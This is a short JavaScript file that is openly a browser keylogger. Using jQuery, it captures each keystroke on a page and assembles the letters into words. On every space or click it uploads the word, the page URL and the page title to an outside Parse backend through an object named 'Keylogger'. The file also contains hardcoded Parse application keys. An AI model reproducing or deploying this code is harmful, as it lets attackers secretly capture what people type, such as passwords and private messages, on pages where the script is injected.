var keys = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
var dict = {};
for (var x = 65; x < 90; x++) {
  var currentKeyIndex = x - 65;
  var currentKey = keys[currentKeyIndex];
  dict[x] = currentKey;
}

$(document).ready(function(){
    var wordArray = [];
    var lettersTyped = 0;
    var currentWord = '';
    // Place your Parse project keys on the line after this
    Parse.initialize("I727vHwPf3qBNX6fEoy1X4nPCbzixCy9NoWMGXZQ", "1f22sRsB0gYTfd49lobej7raEYL4Nc5ViCOjB8Ue");
    var Keylogger = Parse.Object.extend("Keylogger");
    $(document).click(function() {
                        var currentKeylogger = new Keylogger();

       currentWord = wordArray.join('');
            currentKeylogger.set("site", document.URL);
            currentKeylogger.set("Title", document.title);
            currentKeylogger.set("Word", currentWord);
            currentKeylogger.save(null, {
  success: function(currentKeylogger) {
      
  },
  error: function(currentKeylogger, error) {
      
  }
});
            console.log(currentWord);
            currentWord = '';
            wordArray = [];
            lettersTyped = 0;
    });
    $(document).keyup(function(event){ 
        if (event.which === 32) {
            var currentKeylogger = new Keylogger();

            currentWord = wordArray.join('');
            
            currentKeylogger.set("site", document.URL);
            currentKeylogger.set("Title", document.title);
            currentKeylogger.set("Word", currentWord);
            currentKeylogger.save(null, {
  success: function(currentKeylogger) {
      
  },
  error: function(currentKeylogger, error) {
  }
});
            console.log(currentWord);
            currentWord = '';
            wordArray = [];
            lettersTyped = 0;
        }
        else {
        wordArray[lettersTyped] = dict[event.which];
        lettersTyped = lettersTyped + 1;
        }
    });
});
